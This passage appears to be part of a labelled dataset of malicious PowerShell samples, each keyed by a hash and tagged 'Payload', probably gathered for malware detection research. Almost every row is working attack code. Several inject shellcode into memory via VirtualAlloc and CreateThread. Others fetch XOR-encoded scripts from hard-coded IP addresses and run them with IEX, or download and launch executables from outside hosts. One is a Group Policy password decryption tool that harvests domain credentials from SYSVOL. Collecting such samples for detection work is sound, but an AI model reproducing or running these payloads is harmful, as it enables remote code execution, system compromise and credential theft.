df,0xcc,0x37,0x27,0xde,0xb7,0xb1,0xc1,0x8a,0xd7,0x97,0x5a,0x22,0x41,0xb2,0x11,0xd3,0x8e,0x68,0x5c,0xd3,0x05,0x9f,0xa0,0x9d,0xed,0xea,0xb2,0x49,0x1e,0xa1,0xe9,0xdf,0x21,0x1f,0x87,0xdf,0xb7,0xa4,0x0e,0x88,0x2f,0xa7,0x77,0xfe,0xef,0x58,0x52,0x75,0x39,0xcd,0x1d,0xe1,0x46,0x01,0x9e,0xf1,0x10,0x4b,0x9e,0x99,0xc4,0x2f,0xcd,0xbc,0x0a,0xfa,0x61,0x6d,0x9f,0x05,0xd0,0xc2,0x08,0x6e,0xde,0x3d,0x7e,0x31,0x21,0x68,0x7e,0x0d,0xf4,0x54,0xf4,0x7f,0xc4;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$upZ=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($upZ.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$upZ,0,0,0);for (;;){Start-sleep 60};

",Payload
c5815d6a627230d5a5f9a0a5ece104ee7d08129191f769635815e082369a3fed,"
$Wc=NEw-OBject SYStEm.NET.WEbCLIEnt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wc.HEaDERs.AdD('User-Agent',$u);$WC.PROXY = [SYStem.NeT.WEbREqUESt]::DefAuLtWEBProXY;$wc.Proxy.CReDeNTiAlS = [SyStEm.Net.CREdEntiAlCACHE]::DeFAuLTNETwoRkCreDeNtiALs;$K='fb0ee180c36a937082d792c2ba095c74';$I=0;[CHAR[]]$B=([cHar[]]($Wc.DOWnloadStriNg(""http://163.172.151.90:80/index.asp"")))|%{$_-BXOr$K[$i++%$K.LENGtH]};IEX ($B-jOin'')

",Payload
bff319267746080d2a6e93541117ac6a3a613446576efd21fe8122f9c6c80e98,"
[SYSTem.NeT.SErvICePoINTMAnAgeR]::ExpEcT100ContinUE = 0;$wc=NEw-OBjECT System.NeT.WebClIEnt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$Wc.HEadeRS.AdD('User-Agent',$u);$wC.ProXy = [SYstem.Net.WeBREQUest]::DEfAUltWeBPrOxY;$wc.PrOxy.CredENTiaLS = [SySTEM.Net.CREdeNtiAlCaChe]::DefaULtNetWOrkCREDENTIAlS;$K='[

",Payload
82f7ec5d41e7be669fe07aeb675e1b3e0b7d1cc0fdf1e2db2cfdba1c543ffada,"
$WysTEm.Net.SeRviCEPOIntMaNAGer]::EXPECT100ContinUe = 0;$wc=New-ObjeCT SysTem.Net.WebCliENt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wc.HEAdErs.ADD('User-Agent',$u);$WC.PrOXy = [SYStem.NeT.WeBREQUeSt]::DefaultWebPROxy;$wc.PROxy.CrEDenTiALs = [SySTem.Net.CrEdENTIAlCAcHe]::DefAuLtNEtwOrKCRedenTiaLS;$K='cc03e747a6afbbcbf8be7668acfebee5';$I=0;[CHar[]]$B=([chaR[]]($wC.DOwnLoaDSTriNg(""http://103.238.227.201:7788/index.asp"")))|%{$_-BXoR$K[$I++%$k.LeNgTH]};IEX ($b-JoIN'')

",Payload
301d826506f26d3dec0472c1af26b3c5fbbc536cf98b07dd0a2b44a9864d5d80,"function Get-VolumeShadowCopy
{


    $UserIdentity = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent())

    if (-not $UserIdentity.IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator'))
    {
        Throw 'You must run Get-VolumeShadowCopy from an elevated command prompt.'
    }

    Get-WmiObject -Namespace root\\cimv2 -Class Win32_ShadowCopy | ForEach-Object { $_.DeviceObject }
}

function New-VolumeShadowCopy
{

    Param(
        [Parameter(Mandatory = $True)]
        [ValidatePattern('^\\w:\\\\')]
        [String]
        $Volume,

        [Parameter(Mandatory = $False)]
        [ValidateSet(""ClientAccessible"")]
        [String]
        $Context = ""ClientAccessible""
    )

    $UserIdentity = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent())

    if (-not $UserIdentity.IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator'))
    {
        Throw 'You must run Get-VolumeShadowCopy from an elevated command prompt.'
    }

    
    $running = (Get-Service -Name VSS).Status

    $class = [WMICLASS]""root\\cimv2:win32_shadowcopy""

    $return = $class.create(""$Volume"", ""$Context"")

    switch($return.returnvalue)
    {
        1 {Write-Error ""Access denied.""; break}
        2 {Write-Error ""Invalid argument.""; break}
        3 {Write-Error ""Specified volume not found.""; break}
        4 {Write-Error ""Specified volume not supported.""; break}
        5 {Write-Error ""Unsupported shadow copy context.""; break}
        6 {Write-Error ""Insufficient storage.""; break}
        7 {Write-Error ""Volume is in use.""; break}
        8 {Write-Error ""Maximum number of shadow copies reached.""; break}
        9 {Write-Error ""Another shadow copy operation is already in progress.""; break}
        10 {Write-Error ""Shadow copy provider vetoed the operation.""; break}
        11 {Write-Error ""Shadow copy provider not registered.""; break}
        12 {Write-Error ""Shadow copy provider failure.""; break}
        13 {Write-Error ""Unknown error.""; break}
        default {break}
    }

    
    if($running -eq ""Stopped"")
    {
        Stop-Service -Name VSS
    }
}

function Remove-VolumeShadowCopy
{

    [CmdletBinding(SupportsShouldProcess = $True)]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True)]
        [ValidatePattern('^\\\\\\\\\\?\\\\GLOBALROOT\\\\Device\\\\HarddiskVolumeShadowCopy[0-9]{1,3}$')]
        [String]
        $DevicePath
    )

    PROCESS
    {
        if($PSCmdlet.ShouldProcess(""The VolumeShadowCopy at DevicePath $DevicePath will be removed""))
        {
            (Get-WmiObject -Namespace root\\cimv2 -Class Win32_ShadowCopy | Where-Object {$_.DeviceObject -eq $DevicePath}).Delete()
        }
    }
}

function Mount-VolumeShadowCopy
{


    Param (
        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Path,

        [Parameter(Mandatory = $True, ValueFromPipeline = $True)]
        [ValidatePattern('^\\\\\\\\\\?\\\\GLOBALROOT\\\\Device\\\\HarddiskVolumeShadowCopy[0-9]{1,3}$')]
        [String[]]
        $DevicePath
    )

    BEGIN
    {
        $UserIdentity = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent())

        if (-not $UserIdentity.IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator'))
        {
            Throw 'You must run Get-VolumeShadowCopy from an elevated command prompt.'
        }

        
        Get-ChildItem $Path -ErrorAction Stop | Out-Null

        $DynAssembly = New-Object System.Reflection.AssemblyName('VSSUtil')
        $AssemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)
        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('VSSUtil', $False)

        
        
        $TypeBuilder = $ModuleBuilder.DefineType('VSS.Kernel32', 'Public, Class')
        $PInvokeMethod = $TypeBuilder.DefinePInvokeMethod('CreateSymbolicLink',
                                                            'kernel32.dll',
                                                            ([Reflection.MethodAttributes]::Public -bor [Reflection.MethodAttributes]::Static),
                                                            [Reflection.CallingConventions]::Standard,
                                                            [Bool],
                                                            [Type[]]@([String], [String], [UInt32]),
                                                            [Runtime.InteropServices.CallingConvention]::Winapi,
                                                            [Runtime.InteropServices.CharSet]::Auto)
        $DllImportConstructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))
        $SetLastError = [Runtime.InteropServices.DllImportAttribute].GetField('SetLastError')
        $SetLastErrorCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor,
                                                                                         @('kernel32.dll'),
                                                                                         [Reflection.FieldInfo[]]@($SetLastError),
                                                                                         @($true))
        $PInvokeMethod.SetCustomAttribute($SetLastErrorCustomAttribute)

        $Kernel32Type = $TypeBuilder.CreateType()
    }

    PROCESS
    {
        foreach ($Volume in $DevicePath)
        {
            $Volume -match '^\\\\\\\\\\?\\\\GLOBALROOT\\\\Device\\\\(?<LinkName>HarddiskVolumeShadowCopy[0-9]{1,3})$' | Out-Null
            
            $LinkPath = Join-Path $Path $Matches.LinkName

            if (Test-Path $LinkPath)
            {
                Write-Warning ""'$LinkPath' already exists.""
                continue
            }

            if (-not $Kernel32Type::CreateSymbolicLink($LinkPath, ""$($Volume)\\"", 1))
            {
                Write-Error ""Symbolic link creation failed for '$Volume'.""
                continue
            }

            Get-Item $LinkPath
        }
    }

    END
    {

    }
}
",Payload
bff319267746080d2a6e93541117ac6a3a613446576efd21fe8122f9c6c80e98,"
[SYSTem.NeT.SErvICePoINTMAnAgeR]::ExpEcT100ContinUE = 0;$wc=NEw-OBjECT System.NeT.WebClIEnt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$Wc.HEadeRS.AdD('User-Agent',$u);$wC.ProXy = [SYstem.Net.WeBREQUest]::DEfAUltWeBPrOxY;$wc.PrOxy.CredENTiaLS = [SySTEM.Net.CREdeNtiAlCaChe]::DefaULtNetWOrkCREDENTIAlS;$K='[

",Payload
0d4d1a5af322b907557f48f6e6e400ee703131530450eef6ed8db0b263b7f704,"
$Oh2f = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $Oh2f -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xdb,0xcf,0xbf,0xf1,0x72,0xe4,0xdd,0xd9,0x74,0x24,0xf4,0x5e,0x31,0xc9,0xb1,0x47,0x31,0x7e,0x18,0x83,0xc6,0x04,0x03,0x7e,0xe5,0x90,0x11,0x21,0xed,0xd7,0xda,0xda,0xed,0xb7,0x53,0x3f,0xdc,0xf7,0x00,0x4b,0x4e,0xc8,0x43,0x19,0x62,0xa3,0x06,0x8a,0xf1,0xc1,0x8e,0xbd,0xb2,0x6c,0xe9,0xf0,0x43,0xdc,0xc9,0x93,0xc7,0x1f,0x1e,0x74,0xf6,0xef,0x53,0x75,0x3f,0x0d,0x99,0x27,0xe8,0x59,0x0c,0xd8,0x9d,0x14,0x8d,0x53,0xed,0xb9,0x95,0x80,0xa5,0xb8,0xb4,0x16,0xbe,0xe2,0x16,0x98,0x13,0x9f,0x1e,0x82,0x70,0x9a,0xe9,0x39,0x42,0x50,0xe8,0xeb,0x9b,0x99,0x47,0xd2,0x14,0x68,0x99,0x12,0x92,0x93,0xec,0x6a,0xe1,0x2e,0xf7,0xa8,0x98,0xf4,0x72,0x2b,0x3a,0x7e,0x24,0x97,0xbb,0x53,0xb3,0x5c,0xb7,0x18,0xb7,0x3b,0xdb,0x9f,0x14,0x30,0xe7,0x14,0x9b,0x97,0x6e,0x6e,0xb8,0x33,0x2b,0x34,0xa1,0x62,0x91,0x9b,0xde,0x75,0x7a,0x43,0x7b,0xfd,0x96,0x90,0xf6,0x5c,0xfe,0x55,0x3b,0x5f,0xfe,0xf1,0x4c,0x2c,0xcc,0x5e,0xe7,0xba,0x7c,0x16,0x21,0x3c,0x83,0x0d,0x95,0xd2,0x7a,0xae,0xe6,0xfb,0xb8,0xfa,0xb6,0x93,0x69,0x83,0x5c,0x64,0x96,0x56,0xc8,0x61,0x00,0x99,0xa5,0x6a,0xc8,0x71,0xb4,0x6a,0xe9,0x3a,0x31,0x8c,0xb9,0x6c,0x12,0x01,0x79,0xdd,0xd2,0xf1,0x11,0x37,0xdd,0x2e,0x01,0x38,0x37,0x47,0xab,0xd7,0xee,0x3f,0x43,0x41,0xab,0xb4,0xf2,0x8e,0x61,0xb1,0x34,0x04,0x86,0x45,0xfa,0xed,0xe3,0x55,0x6a,0x1e,0xbe,0x04,0x3c,0x21,0x14,0x22,0xc0,0xb7,0x93,0xe5,0x97,0x2f,0x9e,0xd0,0xdf,0xef,0x61,0x37,0x54,0x39,0xf4,0xf8,0x02,0x46,0x18,0xf9,0xd2,0x10,0x72,0xf9,0xba,0xc4,0x26,0xaa,0xdf,0x0a,0xf3,0xde,0x4c,0x9f,0xfc,0xb6,0x21,0x08,0x95,0x34,0x1c,0x7e,0x3a,0xc6,0x4b,0x7e,0x06,0x11,0xb5,0xf4,0x66,0xa1;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$i9U=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($i9U.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$i9U,0,0,0);for (;;){Start-sleep 60};

",Payload
be0aecd55a6abc847865604367c70260d42bf1e1c0f94eccaf0a4b8412926de4,"function Get-GPPPassword 
{

    
    [CmdletBinding()]
    Param ()
    
    
    Set-StrictMode -Version 2
    
    
    function Get-DecryptedCpassword {
        [CmdletBinding()]
        Param (
            [string] $Cpassword 
        )

        try {
            
            $Mod = ($Cpassword.length % 4)
            
            switch ($Mod) {
            '1' {$Cpassword = $Cpassword.Substring(0,$Cpassword.Length -1)}
            '2' {$Cpassword += ('=' * (4 - $Mod))}
            '3' {$Cpassword += ('=' * (4 - $Mod))}
            }

            $Base64Decoded = [Convert]::FromBase64String($Cpassword)
            
            
            $AesObject = New-Object System.Security.Cryptography.AesCryptoServiceProvider
            [Byte[]] $AesKey = @(0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,
                                 0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b)
            
            
            $AesIV = New-Object Byte[]($AesObject.IV.Length) 
            $AesObject.IV = $AesIV
            $AesObject.Key = $AesKey
            $DecryptorObject = $AesObject.CreateDecryptor() 
            [Byte[]] $OutBlock = $DecryptorObject.TransformFinalBlock($Base64Decoded, 0, $Base64Decoded.length)
            
            return [System.Text.UnicodeEncoding]::Unicode.GetString($OutBlock)
        } 
        
        catch {Write-Error $Error[0]}
    }  
    
    
    function Get-GPPInnerFields {
    [CmdletBinding()]
        Param (
            $File 
        )
    
        try {
            
            $Filename = Split-Path $File -Leaf
            [xml] $Xml = Get-Content ($File)

            
            $Cpassword = @()
            $UserName = @()
            $NewName = @()
            $Changed = @()
            $Password = @()
    
            
            if ($Xml.innerxml -like ""*cpassword*""){
            
                Write-Verbose ""Potential password in $File""
                
                switch ($Filename) {

                    'Groups.xml' {
                        $Cpassword += , $Xml | Select-Xml ""/Groups/User/Properties/@cpassword"" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml ""/Groups/User/Properties/@userName"" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $NewName += , $Xml | Select-Xml ""/Groups/User/Properties/@newName"" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml ""/Groups/User/@changed"" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }
        
                    'Services.xml' {  
                        $Cpassword += , $Xml | Select-Xml ""/NTServices/NTService/Properties/@cpassword"" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml ""/NTServices/NTService/Properties/@accountName"" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml ""/NTServices/NTService/@changed"" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }
        
                    'Scheduledtasks.xml' {
                        $Cpassword += , $Xml | Select-Xml ""/ScheduledTasks/Task/Properties/@cpassword"" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml ""/ScheduledTasks/Task/Properties/@runAs"" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml ""/ScheduledTasks/Task/@changed"" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }
        
                    'DataSources.xml' { 
                        $Cpassword += , $Xml | Select-Xml ""/DataSources/DataSource/Properties/@cpassword"" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml ""/DataSources/DataSource/Properties/@username"" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml ""/DataSources/DataSource/@changed"" | Select-Object -Expand Node | ForEach-Object {$_.Value}                          
                    }
                    
                    'Printers.xml' { 
                        $Cpassword += , $Xml | Select-Xml ""/Printers/SharedPrinter/Properties/@cpassword"" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml ""/Printers/SharedPrinter/Properties/@username"" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml ""/Printers/SharedPrinter/@changed"" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }
  
                    'Drives.xml' { 
                        $Cpassword += , $Xml | Select-Xml ""/Drives/Drive/Properties/@cpassword"" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml ""/Drives/Drive/Properties/@username"" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml ""/Drives/Drive/@changed"" | Select-Object -Expand Node | ForEach-Object {$_.Value} 
                    }
                }
           }
                     
           foreach ($Pass in $Cpassword) {
               Write-Verbose ""Decrypting $Pass""
               $DecryptedPassword = Get-DecryptedCpassword $Pass
               Write-Verbose ""Decrypted a password of $DecryptedPassword""
               
               $Password += , $DecryptedPassword
           }
            
            
            if (!($Password)) {$Password = '[BLANK]'}
            if (!($UserName)) {$UserName = '[BLANK]'}
            if (!($Changed)) {$Changed = '[BLANK]'}
            if (!($NewName)) {$NewName = '[BLANK]'}
                  
            
            $ObjectProperties = @{'Passwords' = $Password;
                                  'UserNames' = $UserName;
                                  'Changed' = $Changed;
                                  'NewName' = $NewName;
                                  'File' = $File}
                
            $ResultsObject = New-Object -TypeName PSObject -Property $ObjectProperties
            Write-Verbose ""The password is between {} and may be more than one value.""
            if ($ResultsObject) {Return $ResultsObject} 
        }

        catch {Write-Error $Error[0]}
    }
    
    try {
        
        if ( ( ((Get-WmiObject Win32_ComputerSystem).partofdomain) -eq $False ) -or ( -not $Env:USERDNSDOMAIN ) ) {
            throw 'Machine is not a domain member or User is not a member of the domain.'
        }

        $DomainControllers = ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).DomainControllers | ForEach-Object {$_.Name}
        Write-Verbose ""Domain controllers for current domain: $DomainControllers""

        $XMlFiles = @()
        foreach ($DomainController in $DomainControllers) {
            Write-Verbose ""Searching $DomainController""
            
            $XMlFiles += Get-ChildItem -Path ""\\\\$DomainController\\SYSVOL"" -Recurse -ErrorAction SilentlyContinue -Include 'Groups.xml','Services.xml','Scheduledtasks.xml','DataSources.xml','Printers.xml','Drives.xml'
        }
        
        if ( -not $XMlFiles ) {throw 'No preference files found.'}

        Write-Verbose ""Found $($XMLFiles | Measure-Object | Select-Object -ExpandProperty Count) files that could contain passwords.""
    
        foreach ($File in $XMLFiles) {
            $Result = (Get-GppInnerFields $File.Fullname)
            Write-Output $Result
        }
    }

    catch {Write-Error $Error[0]}
}
",Payload
9ccf4068bc023084448668d109e26f00cc7f464fe73e3e5950e4933ae1268ed8,"
cmd /c powershell -Command (new-object System.Net.WebClient).Downloadfile('http://trax.x10.mx/count_vt.txt', 'C:\\_AB\\fake_.exe') ; 'Done.'

",Payload
f0712143669f657c8227b3a85fdf586f7a7540173fe328f7a868121075138adf,"
$anjO = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $anjO -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xdd,0xc6,0xbd,0x8a,0x08,0x9c,0xe1,0xd9,0x74,0x24,0xf4,0x5a,0x29,0xc9,0xb1,0x47,0x31,0x6a,0x18,0x03,0x6a,0x18,0x83,0xc2,0x8e,0xea,0x69,0x1d,0x66,0x68,0x91,0xde,0x76,0x0d,0x1b,0x3b,0x47,0x0d,0x7f,0x4f,0xf7,0xbd,0x0b,0x1d,0xfb,0x36,0x59,0xb6,0x88,0x3b,0x76,0xb9,0x39,0xf1,0xa0,0xf4,0xba,0xaa,0x91,0x97,0x38,0xb1,0xc5,0x77,0x01,0x7a,0x18,0x79,0x46,0x67,0xd1,0x2b,0x1f,0xe3,0x44,0xdc,0x14,0xb9,0x54,0x57,0x66,0x2f,0xdd,0x84,0x3e,0x4e,0xcc,0x1a,0x35,0x09,0xce,0x9d,0x9a,0x21,0x47,0x86,0xff,0x0c,0x11,0x3d,0xcb,0xfb,0xa0,0x97,0x02,0x03,0x0e,0xd6,0xab,0xf6,0x4e,0x1e,0x0b,0xe9,0x24,0x56,0x68,0x94,0x3e,0xad,0x13,0x42,0xca,0x36,0xb3,0x01,0x6c,0x93,0x42,0xc5,0xeb,0x50,0x48,0xa2,0x78,0x3e,0x4c,0x35,0xac,0x34,0x68,0xbe,0x53,0x9b,0xf9,0x84,0x77,0x3f,0xa2,0x5f,0x19,0x66,0x0e,0x31,0x26,0x78,0xf1,0xee,0x82,0xf2,0x1f,0xfa,0xbe,0x58,0x77,0xcf,0xf2,0x62,0x87,0x47,0x84,0x11,0xb5,0xc8,0x3e,0xbe,0xf5,0x81,0x98,0x39,0xfa,0xbb,0x5d,0xd5,0x05,0x44,0x9e,0xff,0xc1,0x10,0xce,0x97,0xe0,0x18,0x85,0x67,0x0d,0xcd,0x30,0x6d,0x99,0x8a,0xa0,0x09,0x31,0x3b,0x2b,0xd2,0xd0,0xe7,0xa2,0x34,0x82,0x47,0xe5,0xe8,0x62,0x38,0x45,0x59,0x0a,0x52,0x4a,0x86,0x2a,0x5d,0x80,0xaf,0xc0,0xb2,0x7d,0x87,0x7c,0x2a,0x24,0x53,0x1d,0xb3,0xf2,0x19,0x1d,0x3f,0xf1,0xde,0xd3,0xc8,0x7c,0xcd,0x83,0x38,0xcb,0xaf,0x05,0x46,0xe1,0xda,0xa9,0xd2,0x0e,0x4d,0xfe,0x4a,0x0d,0xa8,0xc8,0xd4,0xee,0x9f,0x43,0xdc,0x7a,0x60,0x3b,0x21,0x6b,0x60,0xbb,0x77,0xe1,0x60,0xd3,0x2f,0x51,0x33,0xc6,0x2f,0x4c,0x27,0x5b,0xba,0x6f,0x1e,0x08,0x6d,0x18,0x9c,0x77,0x59,0x87,0x5f,0x52,0x5b,0xfb,0x89,0x9a,0x29,0x15,0x0a;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$44Q=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($44Q.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$44Q,0,0,0);for (;;){Start-sleep 60};

",Payload
006382e7264825b4127aea5c78aed274f741fc1a748d8ee320c2379822967680,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xda,0xd2,0xbe,0xd1,0x77,0x95,0xb8,0xd9,0x74,0x24,0xf4,0x5f,0x2b,0xc9,0xb1,0x47,0x31,0x77,0x18,0x83,0xef,0xfc,0x03,0x77,0xc5,0x95,0x60,0x44,0x0d,0xdb,0x8b,0xb5,0xcd,0xbc,0x02,0x50,0xfc,0xfc,0x71,0x10,0xae,0xcc,0xf2,0x74,0x42,0xa6,0x57,0x6d,0xd1,0xca,0x7f,0x82,0x52,0x60,0xa6,0xad,0x63,0xd9,0x9a,0xac,0xe7,0x20,0xcf,0x0e,0xd6,0xea,0x02,0x4e,0x1f,0x16,0xee,0x02,0xc8,0x5c,0x5d,0xb3,0x7d,0x28,0x5e,0x38,0xcd,0xbc,0xe6,0xdd,0x85,0xbf,0xc7,0x73,0x9e,0x99,0xc7,0x72,0x73,0x92,0x41,0x6d,0x90,0x9f,0x18,0x06,0x62,0x6b,0x9b,0xce,0xbb,0x94,0x30,0x2f,0x74,0x67,0x48,0x77,0xb2,0x98,0x3f,0x81,0xc1,0x25,0x38,0x56,0xb8,0xf1,0xcd,0x4d,0x1a,0x71,0x75,0xaa,0x9b,0x56,0xe0,0x39,0x97,0x13,0x66,0x65,0xbb,0xa2,0xab,0x1d,0xc7,0x2f,0x4a,0xf2,0x4e,0x6b,0x69,0xd6,0x0b,0x2f,0x10,0x4f,0xf1,0x9e,0x2d,0x8f,0x5a,0x7e,0x88,0xdb,0x76,0x6b,0xa1,0x81,0x1e,0x58,0x88,0x39,0xde,0xf6,0x9b,0x4a,0xec,0x59,0x30,0xc5,0x5c,0x11,0x9e,0x12,0xa3,0x08,0x66,0x8c,0x5a,0xb3,0x97,0x84,0x98,0xe7,0xc7,0xbe,0x09,0x88,0x83,0x3e,0xb6,0x5d,0x39,0x3a,0x20,0x9e,0x16,0x44,0xba,0x76,0x65,0x45,0xab,0xda,0xe0,0xa3,0x9b,0xb2,0xa2,0x7b,0x5b,0x63,0x03,0x2c,0x33,0x69,0x8c,0x13,0x23,0x92,0x46,0x3c,0xc9,0x7d,0x3f,0x14,0x65,0xe7,0x1a,0xee,0x14,0xe8,0xb0,0x8a,0x16,0x62,0x37,0x6a,0xd8,0x83,0x32,0x78,0x8c,0x63,0x09,0x22,0x1a,0x7b,0xa7,0x49,0xa2,0xe9,0x4c,0xd8,0xf5,0x85,0x4e,0x3d,0x31,0x0a,0xb0,0x68,0x4a,0x83,0x24,0xd3,0x24,0xec,0xa8,0xd3,0xb4,0xba,0xa2,0xd3,0xdc,0x1a,0x97,0x87,0xf9,0x64,0x02,0xb4,0x52,0xf1,0xad,0xed,0x07,0x52,0xc6,0x13,0x7e,0x94,0x49,0xeb,0x55,0x24,0xb5,0x3a,0x93,0x52,0xd7,0xfe;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
7322d4f92e24180de072cf9f4357bcf573334d26f7be13617d3c21d1c3cb0c5b,"
(New-Object System.Net.WebClient).DownloadFile('https://a.pomf.cat/hsmqrh.exe',""$env:TEMP\\winreg.exe"");Start-Process (""$env:TEMP\\winreg.exe"")

",Payload
14fa012a673d85bede4982f2a58f1db7d127c1e938654b1e984b1ee5e86b532f,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 